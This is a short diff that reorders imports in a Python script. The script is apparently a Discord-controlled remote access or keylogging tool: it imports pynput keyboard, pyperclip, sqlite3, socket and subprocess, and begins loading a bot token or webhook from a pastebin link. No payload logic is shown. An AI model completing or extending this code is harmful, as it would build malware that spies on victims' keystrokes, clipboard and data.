@@ -1,13 +1,7 @@
 
-import discord
-from discord.ext import commands
-import asyncio
-import pyperclip
-import subprocess
 import os
 import sys
 import time
-import qrcode
 import json
 import base64
 import socket
@@ -20,18 +14,21 @@ import random
 import string
 import threading
 import subprocess
-import asyncio
 import sqlite3
-import requests
 import platform
-import discord
-from discord.ext import commands
-from discord import File, Embed
-from datetime import datetime
-from pynput import keyboard
+import asyncio
+import datetime
+import requests
+import pyperclip
 import pyttsx3
+import qrcode
 import aiofiles
 import aiohttp
+from pynput import keyboard
+import discord
+from discord import File, Embed
+from discord.ext import commands
+
 # Bot Token/Webhook Setup 
 config_url = ""  # Replace with your pastebin link with bot token/webhook
 def load_credentials(url):
